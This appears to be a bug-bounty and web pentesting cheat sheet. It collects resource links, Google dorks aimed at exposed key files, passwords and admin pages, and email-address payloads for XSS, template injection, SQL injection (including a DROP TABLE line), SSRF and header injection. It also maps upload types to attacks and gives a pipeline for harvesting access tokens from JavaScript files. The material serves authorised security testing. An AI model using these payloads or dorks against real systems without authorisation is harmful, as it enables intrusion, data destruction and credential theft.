## Bunch of web related stuff to read 

https://pentester.land/

---

## Web ui to test your code 

 jsfiddle.net 

---


## Don't find what you need ? List of writeups, search with keywords.

https://pentester.land/list-of-bug-bounty-writeups.html?fbclid=IwAR1_Q5WRS8Q0mmF4fpxMXLeWmboBxicAAdyqscrnGB1Uxiznu-FjS1xJZSs

---

## Drupal 

Find hidden pages : fuzz /node/$ where $ is a number.

---

## Payload needed ? Here are lists

- SecLists
- Payloadallthethings
- https://portswigger.net/web-security/sql-injection/cheat-sheet
- https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

---

## Need info on how to hunt something ?

https://github.com/KathanP19/HowToHunt
https://www.infosecmatter.com/bug-bounty-tips-1/

---



## Some google dorks

```
inurl:example.com intitle:"index of"
inurl:example.com intitle:"index of /" "*key.pem"
inurl:example.com ext:log
inurl:example.com intitle:"index of" ext:sql|xls|xml|json|csv
inurl:example.com "MYSQL_ROOT_PASSWORD:" ext:env OR ext:yml -git
site:target.com inurl:admin | administrator | adm | login | l0gin | wp-login
intitle:"login" "admin" site:target.com
inurl:admin site:target.com
site:target.com ext:txt | ext:doc | ext:docx | ext:odt | ext:pdf | ext:rtf | ext:sxw | ext:psw | ext:ppt | ext:pptx | ext:pps | ext:csv | ext:mdb
intitle:"index of /" Parent Directory site:target.com
intitle:"index of /admin" site:target.com
intitle:"index of /password" site:target.com
intitle:"index of /mail" site:target.com
intitle:"index of /" (passwd | password.txt) site:target.com
intitle:"index of /" .htaccess site:target.com
inurl:passwd filetype:txt site:target.com
inurl:admin filetype:db site:target.com
filetype:log site:target.com
link:target.com -site:target.com
```


---

## Email address payload 

By @securinti (compiled by @intigriti)
Source: link

The following payloads are all valid e-mail addresses that we can use for pentesting of not only web based e-mail systems.

XSS (Cross-Site Scripting):

```
test+(<script>alert(0)</script>)@example.com
test@example(<script>alert(0)</script>).com
"<script>alert(0)</script>"@example.com
```

Template injection:
```
"<%= 7 * 7 %>"@example.com
test+(${{7*7}})@example.com
```

SQL injection:
```
"' OR 1=1 -- '"@example.com
"mail'); DROP TABLE users;--"@example.com
```

SSRF (Server-Side Request Forgery):
```
john.doe@abc123.burpcollaborator.net
john.doe@[127.0.0.1]
```

Parameter pollution:
```
victim&email=attacker@example.com
```

(Email) header injection:
```
"%0d%0aContent-Length:%200%0d%0a%0d%0a"@example.com
"recipient@test.com>\r\nRCPT TO:<victim+"@test.com
```

---

## Top 10 file upload scenario

ASP / ASPX / PHP5 / PHP / PHP3: Webshell / RCE
SVG: Stored XSS / SSRF / XXE
GIF: Stored XSS / SSRF
CSV: CSV injection
XML: XXE
AVI: LFI / SSRF
HTML / JS : HTML injection / XSS / Open redirect
PNG / JPEG: Pixel flood attack (DoS)
ZIP: RCE via LFI / DoS
PDF / PPTX: SSRF / BLIND XXE

---

## Find access tokens with ffuf and gau
By @Haoneses

- Gather all links of your target:
`cat hosts | sed 's/https\?:\/\///' | gau > urls.txt`

- Filter out javascript urls:
`cat urls.txt | grep -P "\w+\.js(\?|$)" | sort -u > jsurls.txt`

- Use ffuf to get only valid links and send them right into Burp:
`ffuf -mc 200 w jsurls.txt:HFUZZ -u HFUZZ -replay-proxy http://127.0.0.1:8080`

- Use Scan Check Builder Burp extension, add passive profile to extract “accessToken” or “access_token”.

- In Burp run passive scan on those javascript links.

- Extract found tokens and validate them before reporting.

- Use KeyHacks to identify particular API keys, how can they be used and how to check if they are valid.

- Make sure to also try to extract other file types such as .php, .json etc. (Step 2).


---

## NTLM authentication with BurpSuite

1. proxy / options / uncheck "Set Connection Close"
2. User Options / platform authentication / add NTLM

NTLM authenticates the TCP connection, which is not kept alive when using a proxy. This trick solve the issue.





